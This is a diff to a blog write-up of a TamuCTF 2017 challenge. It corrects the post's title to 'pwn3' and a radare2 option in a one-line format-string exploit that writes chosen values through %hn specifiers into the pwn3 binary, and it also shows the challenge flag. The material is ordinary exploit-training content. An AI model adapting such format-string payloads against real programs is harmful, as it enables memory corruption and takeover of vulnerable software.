@@ -11,7 +11,7 @@ cardtitlecolor: 'orange'
 post_categories:
 - CTFs
 date: 2017-08-10T18:56:18+02:00
-description: TamuCTF 2017 - pwn2
+description: TamuCTF 2017 - pwn3
 tags:
 - CTF
 - TamuCTF
@@ -344,5 +344,5 @@ Answer: gigem{F0RM@1NG_1S_H4RD}
 #### Some notes for the author
 
 ```bash
-$ r2 -X "stdin=\"`python -c 'print(\"\x1e\xa0\x04\x08\x1c\xa0\x04\x08\" + \"%2044x%4$hn\" + \"%32167x%5$hn\")'`\"" -d pwn3
+$ r2 -R "stdin=\"`python -c 'print(\"\x1e\xa0\x04\x08\x1c\xa0\x04\x08\" + \"%2044x%4$hn\" + \"%32167x%5$hn\")'`\"" -d pwn3
 ```
